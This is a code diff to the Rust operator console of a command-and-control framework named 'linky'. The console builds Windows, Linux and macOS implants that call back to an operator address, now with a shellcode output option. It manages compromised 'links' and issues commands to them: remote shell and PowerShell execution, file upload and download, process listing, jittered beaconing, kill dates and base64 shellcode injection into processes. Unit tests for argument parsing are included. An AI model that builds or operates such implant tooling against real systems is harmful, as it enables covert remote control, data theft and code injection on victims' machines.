@@ -27,24 +27,27 @@ pub fn run(links: Arc<Mutex<Links>>) {
                     "links" => links_menu(&links, &mut rl),
                     "generate" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate <ip:port>");
+                            ui::print("Usage: generate <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_windows(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_windows(&callback, shellcode);
                         }
                     }
                     "generate-linux" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate-linux <ip:port>");
+                            ui::print("Usage: generate-linux <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_linux(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_linux(&callback, shellcode);
                         }
                     }
 
                     "generate-osx" => {
                         if rest.is_empty() {
-                            ui::print("Usage: generate-osx <ip:port>");
+                            ui::print("Usage: generate-osx <ip:port> [--shellcode]");
                         } else {
-                            crate::generate::generate_osx(rest);
+                            let (callback, shellcode) = parse_generate_args(rest);
+                            crate::generate::generate_osx(&callback, shellcode);
                         }
                     }
                     "help" => print_help(),
@@ -121,7 +124,7 @@ fn links_menu(links: &Arc<Mutex<Links>>, rl: &mut DefaultEditor) {
                         }
                     }
                     "back" | "exit" | "q" => break,
-                    "generate" | "generate-linux" | "links" | "kill" | "quit" => {
+                    "generate" | "generate-linux" | "generate-osx" | "links" | "kill" | "quit" => {
                         ui::print(&format!(
                             "'{}' is a top-level command. Type 'back' to return to the main menu first.",
                             cmd
@@ -191,7 +194,23 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
         let prompt = {
             let l = links.lock().unwrap_or_else(|e| e.into_inner());
             l.get_link(link_id)
-                .map(|lk| format!("{}> ", lk.name))
+                .map(|lk| {
+                    let os_tag = match lk.platform.as_str() {
+                        "windows" => "win",
+                        p if p.contains("linux")
+                            || p.contains("Linux")
+                            || p.contains("Ubuntu")
+                            || p.contains("Debian")
+                            || p.contains("Fedora")
+                            || p.contains("CentOS") =>
+                        {
+                            "lnx"
+                        }
+                        p if p.contains("macOS") || p.contains("Mac") => "osx",
+                        _ => "???",
+                    };
+                    format!("{}|{}> ", lk.name, os_tag)
+                })
                 .unwrap_or_else(|| "link> ".into())
         };
 
@@ -205,7 +224,15 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                 let (cmd, args) = split_first(&line);
 
                 match cmd {
-                    "help" => print_link_help(),
+                    "help" => {
+                        let platform = links
+                            .lock()
+                            .unwrap_or_else(|e| e.into_inner())
+                            .get_link(link_id)
+                            .map(|l| l.platform.clone())
+                            .unwrap_or_default();
+                        print_link_help(&platform);
+                    }
                     "back" | "exit" => break,
                     "info" => show_info(links, link_id),
                     "kill" => {
@@ -270,13 +297,12 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                             }
                         }
                     }
-                    "upload" => {
-                        let parts: Vec<&str> = args.split_whitespace().collect();
-                        if parts.len() < 2 {
-                            ui::print("Usage: upload <local_path> <remote_path>");
-                        } else {
-                            let local_path = parts[0].to_string();
-                            let remote_path = parts[1..].join(" ");
+                    "upload" => match parse_upload_args(args) {
+                        None => ui::print(
+                            "Usage: upload <local_path> <remote_path>  \
+                                (quote paths with spaces: \"path/to file\" /remote/dest)",
+                        ),
+                        Some((local_path, remote_path)) => {
                             let mut l = links.lock().unwrap_or_else(|e| e.into_inner());
                             if let Some(id) = l.get_link(link_id).map(|link| link.id) {
                                 if l.add_upload_task(id, local_path, remote_path).is_some() {
@@ -289,7 +315,7 @@ fn interact(links: &Arc<Mutex<Links>>, link_id: Uuid, rl: &mut DefaultEditor) {
                                 }
                             }
                         }
-                    }
+                    },
 
                     // ── Process injection ───────────────────────────────
                     "inject" => {
@@ -322,19 +348,20 @@ pub fn show_completed_task_results(links: &Arc<Mutex<Links>>, link_id: Uuid) {
 
     for task in &mut link.tasks {
         if task.status == TaskStatus::Completed && !task.displayed {
-            const OUTPUT_BOX_WIDTH: usize = 54;
+            const MIN_BOX_WIDTH: usize = 54;
             let now = Local::now().format("%H:%M:%S");
             let header_text = format!("═ {} · {} · {} ", link_name, task.cli_command, now);
-            let pad = OUTPUT_BOX_WIDTH.saturating_sub(header_text.chars().count());
+            let box_width = header_text.chars().count().max(MIN_BOX_WIDTH);
+            let pad = box_width - header_text.chars().count();
 
             if task.output.is_empty() {
                 ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
                 ui::print(&format!("║ {} (no output)", task.cli_command));
-                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
+                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
             } else {
                 ui::print_cyan_bold(&format!("╔{}{}╗", header_text, "═".repeat(pad)));
                 ui::print(&format!("║ {}", task.output));
-                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(OUTPUT_BOX_WIDTH)));
+                ui::print_cyan_bold(&format!("╚{}╝", "═".repeat(box_width)));
             }
 
             task.displayed = true;
@@ -415,20 +442,165 @@ fn split_first(s: &str) -> (&str, &str) {
     }
 }
 
-fn print_help() {
-    ui::print("  links                    Manage active links");
-    ui::print("  generate <ip:port>       Build Windows implant (x86_64-pc-windows-gnu)");
-    ui::print("  generate-linux <ip:port> Build Linux implant   (x86_64-unknown-linux-musl)");
-    ui::print("  generate-osx <ip:port>   Build macOS implant   (x86_64-apple-darwin)");
-    ui::print("  help                     Show this help");
-    ui::print("  exit / kill              Quit linky");
+/// Parse upload arguments: `"local path" /remote` or `local /remote`.
+/// Returns `Some((local, remote))` or `None` if the format is invalid.
+fn parse_upload_args(args: &str) -> Option<(String, String)> {
+    let args = args.trim();
+    if args.is_empty() {
+        return None;
+    }
+    if let Some(rest) = args.strip_prefix('"') {
+        // Quoted local path: "path with spaces" /remote/dest
+        let end = rest.find('"')?;
+        let local = rest[..end].to_string();
+        let remote = rest[end + 1..].trim().to_string();
+        if remote.is_empty() {
+            return None;
+        }
+        Some((local, remote))
+    } else {
+        // Unquoted: first whitespace-delimited token is the local path
+        let i = args.find(char::is_whitespace)?;
+        let local = args[..i].to_string();
+        let remote = args[i..].trim_start().to_string();
+        if remote.is_empty() {
+            return None;
+        }
+        Some((local, remote))
+    }
 }
 
-fn print_link_help() {
+/// Parse "10.0.0.1:8443 --shellcode" → ("10.0.0.1:8443", true)
+/// Parse "10.0.0.1:8443"             → ("10.0.0.1:8443", false)
+fn parse_generate_args(args: &str) -> (String, bool) {
+    let parts: Vec<&str> = args.split_whitespace().collect();
+    let shellcode = parts.contains(&"--shellcode");
+    let callback = parts
+        .iter()
+        .find(|p| !p.starts_with("--"))
+        .map(|p| p.to_string())
+        .unwrap_or_default();
+    (callback, shellcode)
+}
+
+fn print_help() {
+    ui::print("  links                                  Manage active links");
+    ui::print("  generate <ip:port> [--shellcode]       Build Windows implant");
+    ui::print("  generate-linux <ip:port> [--shellcode] Build Linux implant");
+    ui::print("  generate-osx <ip:port> [--shellcode]   Build macOS implant");
+    ui::print("  help                                   Show this help");
+    ui::print("  exit / kill                            Quit linky");
+    ui::print("");
+    ui::print("  --shellcode   Produce minimal .bin via objcopy (Linux/macOS)");
+    ui::print("                or PE copy (Windows — use sRDI/Donut for PIC).");
+    ui::print("                Uses release-shellcode profile (panic=abort, lto).");
+    ui::print("");
+    ui::print("  LINKY_OUTPUT_DIR  Output directory for generated implants (default: .)");
+}
+
+#[cfg(test)]
+mod tests {
+    use super::*;
+
+    // ── split_first ───────────────────────────────────────────────────────────
+
+    #[test]
+    fn split_first_with_args() {
+        assert_eq!(split_first("sleep 30"), ("sleep", "30"));
+    }
+
+    #[test]
+    fn split_first_no_args() {
+        assert_eq!(split_first("whoami"), ("whoami", ""));
+    }
+
+    #[test]
+    fn split_first_trims_leading_spaces_in_rest() {
+        assert_eq!(split_first("cd   /tmp"), ("cd", "/tmp"));
+    }
+
+    #[test]
+    fn split_first_empty_string() {
+        assert_eq!(split_first(""), ("", ""));
+    }
+
+    // ── parse_upload_args ────────────────────────────────────────────────────
+
+    #[test]
+    fn parse_upload_args_simple_unquoted() {
+        let (local, remote) = parse_upload_args("/local/file.txt /remote/dest").unwrap();
+        assert_eq!(local, "/local/file.txt");
+        assert_eq!(remote, "/remote/dest");
+    }
+
+    #[test]
+    fn parse_upload_args_quoted_path_with_spaces() {
+        let (local, remote) =
+            parse_upload_args("\"path with spaces/file.txt\" /remote/dest").unwrap();
+        assert_eq!(local, "path with spaces/file.txt");
+        assert_eq!(remote, "/remote/dest");
+    }
+
+    #[test]
+    fn parse_upload_args_empty_returns_none() {
+        assert!(parse_upload_args("").is_none());
+    }
+
+    #[test]
+    fn parse_upload_args_whitespace_only_returns_none() {
+        assert!(parse_upload_args("   ").is_none());
+    }
+
+    #[test]
+    fn parse_upload_args_only_local_no_remote_returns_none() {
+        assert!(parse_upload_args("/local/only").is_none());
+    }
+
+    #[test]
+    fn parse_upload_args_quoted_no_remote_returns_none() {
+        assert!(parse_upload_args("\"path with spaces\"").is_none());
+    }
+
+    // ── parse_generate_args ──────────────────────────────────────────────────
+
+    #[test]
+    fn parse_generate_args_callback_only() {
+        let (cb, sc) = parse_generate_args("10.0.0.1:8443");
+        assert_eq!(cb, "10.0.0.1:8443");
+        assert!(!sc);
+    }
+
+    #[test]
+    fn parse_generate_args_with_shellcode_flag_after() {
+        let (cb, sc) = parse_generate_args("10.0.0.1:8443 --shellcode");
+        assert_eq!(cb, "10.0.0.1:8443");
+        assert!(sc);
+    }
+
+    #[test]
+    fn parse_generate_args_with_shellcode_flag_before() {
+        let (cb, sc) = parse_generate_args("--shellcode 10.0.0.1:8443");
+        assert_eq!(cb, "10.0.0.1:8443");
+        assert!(sc);
+    }
+
+    #[test]
+    fn parse_generate_args_empty_returns_empty_callback() {
+        let (cb, sc) = parse_generate_args("--shellcode");
+        assert_eq!(cb, "");
+        assert!(sc);
+    }
+}
+
+fn print_link_help(platform: &str) {
+    let is_win = platform == "windows";
+
     ui::print("  ── Execution ────────────────────────────────────────");
-    ui::print("  shell <cmd>              Send raw command string");
-    ui::print("  cmd <args>               Execute via cmd.exe /C        (Windows only)");
-    ui::print("  powershell <args>        Execute via powershell.exe     (Windows only)");
+    ui::print("  shell <cmd>              Run via /bin/sh (Linux/macOS) or cmd.exe (Windows)");
+    if is_win {
+        ui::print("  cmd <args>               Execute via cmd.exe /C");
+        ui::print("  powershell <args>        Execute via powershell.exe");
+    }
     ui::print("  ── Navigation ───────────────────────────────────────");
     ui::print("  ls [path]                List directory");
     ui::print("  cd <path>                Change directory");
@@ -437,7 +609,7 @@ fn print_link_help() {
     ui::print("  pid                      Process ID");
     ui::print("  ── Reconnaissance ───────────────────────────────────");
     ui::print("  info                     Detailed system information");
-    ui::print("  ps                       List running processes      (Linux/macOS: /proc, Windows: tasklist)");
+    ui::print("  ps                       List running processes");
     ui::print("  netstat                  List network connections");
     ui::print("  ── File transfer ────────────────────────────────────");
     ui::print("  download <path>          Download file from implant");
@@ -445,9 +617,11 @@ fn print_link_help() {
     ui::print("  ── Operational ──────────────────────────────────────");
     ui::print("  sleep <s> [jitter%]      Set polling interval (e.g. sleep 30 20)");
     ui::print("  killdate <date|clear>    Set auto-exit date   (e.g. killdate 2026-12-31)");
-    ui::print("  ── Windows only ─────────────────────────────────────");
-    ui::print("  integrity                Token integrity level");
-    ui::print("  inject <pid> <b64>       Inject base64 shellcode into PID");
+    if is_win {
+        ui::print("  ── Windows ──────────────────────────────────────────");
+        ui::print("  integrity                Token integrity level");
+        ui::print("  inject <pid> <b64>       Inject base64 shellcode into PID");
+    }
     ui::print("  ── Session ──────────────────────────────────────────");
     ui::print("  kill                     Send exit + mark link dead");
     ui::print("  back                     Return to links menu");
